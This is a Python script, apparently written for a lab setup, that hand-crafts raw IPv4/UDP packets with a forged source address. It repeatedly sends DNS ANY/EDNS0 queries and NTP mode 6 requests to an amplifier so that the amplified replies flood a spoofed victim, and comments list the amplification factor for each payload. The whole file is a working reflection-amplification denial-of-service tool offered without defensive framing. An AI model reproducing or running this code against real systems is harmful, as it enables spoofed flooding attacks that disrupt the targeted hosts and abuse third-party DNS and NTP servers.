import socket
import struct
from time import sleep


def build_udp_packet(data, src_ip, src_port, dst_ip, dst_port):
    packet_len = len(data) + 8

    checksum_payload = get_bytearray_of_ip_string(src_ip) \
                       + get_bytearray_of_ip_string(dst_ip) \
                       + struct.pack('!BBH', 0, socket.IPPROTO_UDP, packet_len) \
                       + struct.pack('!4H', src_port, dst_port, packet_len, 0) + data

    return struct.pack('!4H', src_port, dst_port, packet_len, make_udp_checksum(checksum_payload)) + data


def make_udp_checksum(data):
    if len(data) % 2:
        data += struct.pack('!B', 0)

    return make_ip_checksum(data)


def get_bytearray_of_ip_string(ip):
    return bytearray([int(p) for p in ip.split('.')])


def make_ip_checksum(header):
    short_sum = sum(((header[i] << 8) + header[i + 1]) for i in range(0, len(header), 2))

    return ~((short_sum >> 16) + (short_sum & 0xFFFF)) & 0xFFFF


def build_ipv4_udp_packet(udp_payload, src_ip, src_port, dst_ip, dst_port):
    udp_payload = build_udp_packet(udp_payload, src_ip, src_port, dst_ip, dst_port)

    ver = 4
    ihl = 5
    tos = 0
    total_length = ihl * 4 + len(udp_payload)
    identification = 1
    ttl = 64
    protocol = socket.IPPROTO_UDP

    checksum_payload = struct.pack('!BBH', (ver << 4) + ihl, tos, total_length) \
                       + struct.pack('!HH', identification, 0) \
                       + struct.pack('!BBH', ttl, protocol, 0) \
                       + get_bytearray_of_ip_string(src_ip) \
                       + get_bytearray_of_ip_string(dst_ip)

    return struct.pack('!BBH', (ver << 4) + ihl, tos, total_length) \
           + struct.pack('!HH', identification, 0) \
           + struct.pack('!BBH', ttl, protocol, make_ip_checksum(checksum_payload)) \
           + get_bytearray_of_ip_string(src_ip) \
           + get_bytearray_of_ip_string(dst_ip) \
           + udp_payload


def get_ethernet_header(dst_ip, dst_port):
    udp_packet = build_udp_packet(
        b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06google\x03com\x00\x00\x01\x00\x01',
        '192.168.10.1',
        61924,
        dst_ip,
        dst_port,
    )

    send_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)

    # to capture packet to send
    recv_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))

    send_socket.sendto(udp_packet, (dst_ip, dst_port))

    while True:
        recv_data, sender = recv_socket.recvfrom(512)

        src_ip_hex = ''.join('{:02x}'.format(x) for x in recv_data[26:30])
        dst_ip_hex = ''.join('{:02x}'.format(x) for x in recv_data[30:34])

        # find captured packet by ignoring traffic between host and attacker(10.0.2.15 = 0a00020f)
        if src_ip_hex != '0a00020f' and dst_ip_hex != '0a00020f':
            send_socket.close()
            recv_socket.close()
            return recv_data[0:14]


if __name__ == "__main__":
    amp_ip = '192.168.20.1'
    victim_ip = '192.168.30.1'

    ethernet_header = get_ethernet_header(amp_ip, 53)
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)

    def attack(port, udp_payload):
        packet = ethernet_header \
                 + build_ipv4_udp_packet(
                    udp_payload,
                    victim_ip, port,
                    amp_ip, port,
                )

        s.sendto(packet, ('enp0s8', 0))


    while True:
        # . 255 EDNS0 (BAF 92.4)
        # attack(53, b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\xff\x00\x01\x00\x00)\x10\x00\x00\x00\x80\x00\x00\x00')
        # mitre.org 255 EDNS0 (BAF 108.77)
        attack(53, b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x05mitre\x03org\x00\x00\xff\x00\x01\x00\x00)#(\x00\x00\x80\x00\x00\x00')

        sleep(0.5)
        # NTP version 4 mode 6 op_code 2 sequence 2560 (BAF 32.67)
        attack(123, b'&\x02\n\x00\x00\x00\x00\x00\x00\x00\x00\x00')
        sleep(0.5)
